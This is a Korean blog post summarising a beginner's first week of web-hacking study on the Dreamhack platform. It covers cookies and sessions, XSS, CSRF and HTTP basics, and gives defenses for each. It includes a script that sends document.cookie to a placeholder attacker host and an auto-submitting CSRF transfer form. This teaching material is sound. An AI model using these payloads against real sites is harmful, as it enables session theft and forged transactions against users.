---
title: "웹해킹 1주차"
description:
date: 2025-05-08
update: 2021-05-08
tags:
  - 웹해킹
series: "웹해킹"
---
# 🌱 Dreamhack 새싹 문제 풀이 & 웹 해킹 로드맵 학습 정리

요즘 웹 해킹 공부를 본격적으로 시작하면서 Dreamhack이라는 플랫폼을 활용하고 있어요.  
실습 중심이라 직접 손으로 해보며 배우기 좋고, 강의도 체계적으로 잘 구성되어 있어서 혼자 공부하기에 정말 괜찮습니다.  
이 글에서는 지금까지 풀어본 문제들과 수강한 강의, 그리고 각 취약점에 대한 개념과 예시까지 정리해보려고 합니다.

---

## ✅ 1. 새싹 단계 문제 풀이 (총 13문제)

Dreamhack의 새싹 단계 문제들은 웹 해킹 입문자에게 최적화되어 있어요.  
웹 개발을 조금 해보신 분이라면 전부 풀이 가능하다고 생각합니다.  

제가 풀었던 문제는 아래와 같습니다:

- https://dreamhack.io/wargame/challenges/267  
- https://dreamhack.io/wargame/challenges/850  
- https://dreamhack.io/wargame/challenges/830  
- https://dreamhack.io/wargame/challenges/96  
- https://dreamhack.io/wargame/challenges/266  
- https://dreamhack.io/wargame/challenges/6  
- https://dreamhack.io/wargame/challenges/45  
- https://dreamhack.io/wargame/challenges/12  
- https://dreamhack.io/wargame/challenges/37  
- https://dreamhack.io/wargame/challenges/1  
- https://dreamhack.io/wargame/challenges/1113  
- https://dreamhack.io/wargame/challenges/834  
- https://dreamhack.io/wargame/challenges/873

문제를 풀다 보면 단순히 정답을 맞추는 것이 아니라,  
공격 흐름과 시스템의 취약한 구조까지 생각해보게 되면서 사고방식 자체가 달라지는 걸 느낄 수 있어요.

---

## 📚 2. Dreamhack 웹 해킹 로드맵 수강

문제 풀이만으로는 부족하다고 느껴서 Dreamhack의 공식 로드맵 강의도 함께 수강했습니다.  
강의는 실습 중심이고 개념도 쉽게 설명해줘서 복습용으로도 좋았어요.

### ✅ 수강 완료
- [웹 해킹 로드맵](https://dreamhack.io/lecture/roadmaps/1)

### 📌 수강 예정
- [웹 취약점 심화 로드맵](https://dreamhack.io/lecture/roadmaps/13)  
- [보안 개발자를 위한 웹 취약점 로드맵](https://dreamhack.io/lecture/roadmaps/15)

---

## 🔐 쿠키 & 세션

### ✅ 쿠키(Cookie)란?

쿠키는 브라우저에 저장되는 작은 데이터로, 서버가 응답 시 아래처럼 설정해줍니다.

```http
Set-Cookie: session_id=abc123; HttpOnly; Secure
```

이후 클라이언트는 요청할 때마다 자동으로 전송해요:

```http
Cookie: session_id=abc123
```

- HttpOnly: 자바스크립트로 쿠키 접근을 막아줍니다. (`document.cookie` 방어)
- Secure: HTTPS 환경에서만 쿠키가 전송되게 제한합니다.

### ✅ 세션(Session)이란?

서버에 저장되는 사용자 상태 정보입니다.  
클라이언트는 세션 ID만 들고 있고, 실제 데이터는 서버에 저장돼요.

```python
# Flask 예시
session['user_id'] = 1234
```

서버는 세션 ID를 쿠키로 전달하고, 사용자가 요청을 보낼 때마다 ID를 이용해 해당 세션 정보를 불러옵니다.

---

## 🧨 XSS (Cross Site Scripting)

### ✅ XSS란?

사용자의 입력을 필터링하지 않고 페이지에 그대로 출력할 경우, 악성 스크립트가 실행되는 취약점입니다.

### ✅ 예시: document.cookie 탈취

```html
<script>
  fetch("http://attacker.com/steal?cookie=" + document.cookie);
</script>
```

HttpOnly가 설정되어 있지 않다면 쿠키를 탈취할 수 있어요.

### ✅ Reflective XSS 흐름

```html
<!-- URL: ?q=<script>alert('xss')</script> -->
<p>검색어: <script>alert('xss')</script></p>
```

### ✅ 방어 방법

- HTML 이스케이프 처리 (`<`, `>`, `"`)
- Content-Security-Policy 헤더 설정
- HttpOnly, Secure 옵션 설정
- 입력값 검증 및 출력 위치에 따른 컨텍스트 고려

---

## 🎯 CSRF (Cross Site Request Forgery)

### ✅ CSRF란?

로그인 상태의 사용자가 의도치 않은 요청을 하게 만드는 공격입니다.

### ✅ 예시

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>

<script>document.forms[0].submit();</script>
```

브라우저는 세션 쿠키를 자동으로 보내기 때문에 실제 사용자 권한으로 요청이 처리됩니다.

### ✅ 방어 방법

- CSRF 토큰 사용 (`<input type="hidden" name="csrf_token" value="...">`)
- Referer / Origin 헤더 검증
- 쿠키에 SameSite=Lax 또는 SameSite=Strict 옵션 설정

---

## 🌐 웹 기초 지식 요약

### ✅ 요청 / 응답 구조

```http
GET /index.html HTTP/1.1
Host: example.com
```

응답:

```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html>
```

BurpSuite 같은 도구를 사용하면 이 흐름을 실시간으로 가로채고 수정해볼 수 있어요.

이 구조를 이해하면 XSS나 CSRF 같은 취약점도 흐름상으로 이해하기 훨씬 쉬워집니다.

---

## 🛠️ SQLi 학습 준비

SQL Injection 학습을 위한 준비로 SQL 문법을 복습하고 있어요.  
기초적인 CRUD 명령들을 다시 정리하면서, 실제 쿼리가 어떻게 작동하는지 감을 익히는 중입니다.

### ✅ 복습한 내용

- CREATE, DROP  
- INSERT, SELECT, UPDATE, DELETE  

조만간 Dreamhack의 SQLi 강의 및 실습 문제도 풀면서 그 내용을 따로 정리해볼 예정이에요.

---

## ✍️ 마무리

이번 글에서는 Dreamhack 새싹 단계 문제 풀이와  
웹 해킹 로드맵 강의 수강, 그리고 주요 취약점 개념(Cookie/Session, XSS, CSRF 등)에 대해 실습 중심으로 정리해봤습니다.

혼자 공부하시는 분들께는 Dreamhack 플랫폼 정말 추천드리고 싶어요.  
실습 → 개념 → 적용까지 흐름이 잘 잡혀 있어서 보안 쪽을 입문할 때 접근하기 수월했습니다.

다음에는 SQLi, Command Injection, LFI, SSRF 같은 취약점도 하나씩 실습하고 정리해보겠습니다.  
읽어주셔서 감사합니다!
